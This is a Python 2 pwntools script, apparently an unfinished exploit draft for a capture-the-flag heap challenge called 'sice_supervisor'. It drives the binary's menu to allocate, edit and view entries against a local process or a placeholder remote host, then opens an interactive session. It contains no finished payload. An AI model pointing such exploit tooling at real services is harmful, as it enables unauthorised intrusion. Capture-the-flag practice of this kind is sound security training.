#!/usr/bin/python2 

from pwn import *
import time

exe = ELF("sice_supervisor_patched")
libc = ELF("libs/libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

sl = lambda r,a: r.sendline('{}'.format(a))
sla = lambda r,a,b: r.sendlineafter(a, '{}'.format(b))
ru = lambda r,a: r.recvuntil(a)
g = lambda r: gdb.attach(r)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def create(r):
    sla(r,">", 1)

def sice(r, i, buffer):
    print ru(r, ">")
    sl(r, 2)
    print ru(r, ">")
    sl(r,i)
    print ru(r, ">")
    sl(r,buffer)

def zzz():
    time.sleep(3.1)

def create_deet(r, i, size):
    sice(r,i,"1")
    sice(r,i,size)
    zzz()

def remove_deet(r, i, di):
    sice(r, i, "2")
    sice(r, i, di)
    zzz()

def edit_deet(r, i, di, buffer):
    sice(r, i, "3")
    sice(r, i, di)
    sice(r, i, buffer)
    zzz()

def view_deet(r, i, di):
    sice(r, i, "4")
    sice(r, i, di)
    zzz()


def main():
    r = conn()

    create(r)
    create(r)
    
    create_deet(r, 0, "400")
    edit_deet(r, 0, 0, "A"*80)
    #view_deet(r, 0, 0)
    
    #create_deet(r, 0, "31")
    
    create_deet(r, 1, "400")
    edit_deet(r, 1, 0, "B"*40)
    view_deet(r, 1, 0)
    
    #remove_deet(r,0,0)
    #remove_deet(r, 0, 2)
    #create_deet(r, 0, "400")
    #view_deet(r, 0, 0)
    r.interactive()


if __name__ == "__main__":
    main()
